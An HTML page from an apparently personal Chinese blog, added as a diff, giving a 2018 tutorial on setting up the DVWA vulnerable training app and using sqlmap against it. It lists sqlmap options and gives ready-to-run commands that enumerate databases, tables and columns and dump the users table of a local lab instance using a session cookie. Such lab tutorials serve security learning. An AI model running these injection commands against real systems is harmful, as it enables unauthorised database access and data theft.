@@ -1,0 +1,258 @@
+
+<!DOCTYPE html>
+<html>
+  <head>
+    
+<meta charset="utf-8" >
+
+<title>渗透测试工具——SQLmap | 小小王的后花园</title>
+<meta name="description" content="小小王的后花园">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.min.css">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="http://wangqunsong.top/favicon.ico?v=1556375647041">
+<link rel="stylesheet" href="http://wangqunsong.top/styles/main.css">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main">
+      <div class="site-header-container">
+  <div class="site-header">
+    <div class="left">
+      <a href="http://wangqunsong.top">
+        <img class="avatar" src="http://wangqunsong.top/images/avatar.png?v=1556375647041" alt="" width="32px" height="32px">
+      </a>
+      <a href="http://wangqunsong.top">
+        <h1 class="site-title">小小王的后花园</h1>
+      </a>
+    </div>
+    <div class="right">
+      <transition name="fade">
+        <i class="icon" :class="{ 'icon-close-outline': menuVisible, 'icon-menu-outline': !menuVisible }" @click="menuVisible = !menuVisible"></i>
+      </transition>
+    </div>
+  </div>
+</div>
+
+<transition name="fade">
+  <div class="menu-container" style="display: none;" v-show="menuVisible">
+    <div class="menu-list">
+      
+        
+          <a href="http://wangqunsong.top" class="menu purple-link">
+            首页
+          </a>
+        
+      
+        
+          <a href="http://wangqunsong.top/archives" class="menu purple-link">
+            归档
+          </a>
+        
+      
+        
+          <a href="http://wangqunsong.top/tags" class="menu purple-link">
+            标签
+          </a>
+        
+      
+        
+          <a href="http://wangqunsong.top/post/guan-yu-wo/" class="menu purple-link">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+</transition>
+
+
+      <div class="content-container">
+        <div class="post-detail">
+          
+          <h2 class="post-title">渗透测试工具——SQLmap</h2>
+          <div class="post-info post-detail-info">
+            <span><i class="icon-calendar-outline"></i> 2018-12-30</span>
+            
+              <span>
+                <i class="icon-pricetags-outline"></i>
+                
+                  <a href="http://wangqunsong.top/tag/gmqBiNDvl">
+                    安全测试
+                    
+                  </a>
+                
+              </span>
+            
+          </div>
+          <div class="post-content">
+            <p>👏  欢迎使用 来到小小王的后花园！<br>
+✍️  这里仅仅是一个记录个人成长的地方，现在所处的位置是<strong>渗透测试工具——SQLmap</strong></p>
+<!-- more --> 
+<p>sqlmap介绍</p>
+<pre><code> sqlmap 是一个开源的渗透测试工具，可以用来自动化的检测，利用SQL注入漏洞，获取数据库服务器的权限。它具有功能强大的检测引擎,针对各种不同类型数据库的渗透测试的功能选项，包括获取数据库中存储的数据，访问操作系统文件甚至可以通过外带数据连接的方式执行操作系统命令。
+</code></pre>
+<p>-----来自sqlmap项目主页</p>
+<p>搭建渗透演练系统——DVWA</p>
+<p>DVWA介绍</p>
+<pre><code>    DVWA(Dam Vulnerable Web Application) 是使用 PHP+Mysql 编写的一套用于常规WEB漏洞教学和检测的 WEB 脆弱性测试程序。其中包含了SQL 注入、XSS、盲注等常见的一些漏洞。
+</code></pre>
+<p>DVWA的项目主页</p>
+<p>安装PHP集成环境</p>
+<pre><code>    建议使用模拟渗透系统演练sqlmap，这里为了简单使用了phpstudy2016，下载地址：phpstudy2016下载。在windows上安装过程很简单，一直下一步即可，如下即安装成功：
+</code></pre>
+<p>安装DVWA</p>
+<p>DVWA下载地址</p>
+<ul>
+<li>
+<ol>
+<li>将下载的DWVA压缩包解压后放在phpstady2016的安装目录\WWW路径下：</li>
+</ol>
+</li>
+<li>
+<ol>
+<li>进入DWVA的config文件夹，将其中的配置文件重命名为config.inc.php，并编辑db_password字段为 root 。(集成环境默认的MYSQL链接用户名和密码为 root/root)</li>
+</ol>
+</li>
+</ul>
+<p>创建数据库</p>
+<pre><code>    用浏览器访问http://你的IP/DVWA-master/index.php，并创建数据库，看到successful即创建成功。
+</code></pre>
+<p>重新登录</p>
+<pre><code>    数据库创建成果后，再次访问http://你的IP/DVWA-master/index.php，此时需要登录，默认用户名 admin， 默认密码 password。至此安装完成。
+</code></pre>
+<p>SQLmap</p>
+<p>安装</p>
+<ul>
+<li>
+<ol>
+<li>由于SQLmap依赖于python环境，所以需要先安装python(官网说明pytnon版本为2.6，2.7)，并配置环境变量，此过程不再赘述；</li>
+</ol>
+</li>
+<li>
+<ol>
+<li>到SQLmap官网或者Github下载zip压缩包，将压缩包解压并重命名为sqlmap后放到python的安装路径下；</li>
+</ol>
+</li>
+<li>
+<ol>
+<li>
+<h2 id="为了简便可以在桌面新建一个sqlmap的快捷方式">为了简便，可以在桌面新建一个sqlmap的快捷方式：</h2>
+<ul>
+<li></li>
+<li></li>
+</ul>
+</li>
+</ol>
+</li>
+</ul>
+<p>SQLmap使用方法</p>
+<ul>
+<li>
+<p>查看sqlmap参数</p>
+<p>python sqlmap.py -h</p>
+<p>【参数解释】：
+—cookie =&gt; 设置我们的 cookie 值 “将 DVWA 安全等级设置为 low”
+—data =&gt; 设置 POST 提交的值，如果是 GET 提交，不需要此选项
+-u =&gt; 指定目标 URL
+-b =&gt; 获取 DBMS banner
+—current-db =&gt; 获取当前数据库
+—current-user =&gt; 获取当前数据库的用户
+—tables =&gt; 获取数据库里所有的表名
+—columns =&gt; 获取表里的所有字段
+—dump =&gt; 获取值
+—current-user =&gt; 获取当前用户
+-D =&gt; 爆库指定数据库名
+-T =&gt; 爆库指定表名
+-C =&gt; 爆库指定字段名
+—string =&gt; 当查询可用时用来匹配页面中的字符串
+—users =&gt; 枚举 DBMS 用户
+—password =&gt; 枚举 DBMS 用户密码 hash
+—dbs =&gt; 枚举 DBMS 中的数据库</p>
+</li>
+<li>
+<p>获取请求地址和Cookie</p>
+</li>
+<li>
+<p>获取数据库名称（--current-db）
+python sqlmap.py  -u &quot;http://192.168.50.39/DVWA-master/vulnerabilities/sqli/?id=wang&amp;Submit=Submit&quot; --cookie=&quot;PHPSESSID=r9opl1ud6krq966l3cj7mnd4bb; security=low&quot; --current-db
+URL和cookie需替换为自己的值，URL的请求地址不需要token值;并将security值置为 low</p>
+</li>
+<li>
+<p>获取表（--tables）
+python sqlmap.py  -u &quot;http://192.168.50.39/DVWA-master/vulnerabilities/sqli/?id=wang&amp;Submit=Submit&quot; --cookie=&quot;PHPSESSID=r9opl1ud6krq966l3cj7mnd4bb; security=low&quot; -D dvwa --tables</p>
+</li>
+<li>
+<p>获取字段（--columns）</p>
+<p>python sqlmap.py  -u &quot;http://192.168.50.39/DVWA-master/vulnerabilities/sqli/?id=wang&amp;Submit=Submit&quot; --cookie=&quot;PHPSESSID=r9opl1ud6krq966l3cj7mnd4bb; security=low&quot; -D dvwa --tables  -T users --columns</p>
+</li>
+<li>
+<p>获取数据（--dump）</p>
+<p>python sqlmap.py  -u &quot;http://192.168.50.39/DVWA-master/vulnerabilities/sqli/?id=wang&amp;Submit=Submit&quot; --cookie=&quot;PHPSESSID=r9opl1ud6krq966l3cj7mnd4j4; security=low&quot; -D dvwa --tables  -T users --columns -C user_id --dump</p>
+</li>
+</ul>
+<p>目前为止，对SQLmap已有了基本的认识，更多的用法请访问官网说明</p>
+
+          </div>
+        </div>
+
+        
+          <div class="next-post">
+            <a class="purple-link" href="http://wangqunsong.top/post/web-gong-ji-zhi-_csrfzhuan">
+              <h3 class="post-title">
+                下一篇：WEB攻击之_CSRF「转]
+              </h3>
+            </a>
+          </div>
+          
+      </div>
+
+      
+
+      <div class="site-footer">
+  <div class="slogan">小小王的后花园</div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+</div>
+
+
+    </div>
+    <script type="application/javascript">
+
+hljs.initHighlightingOnLoad()
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+  </body>
+</html>
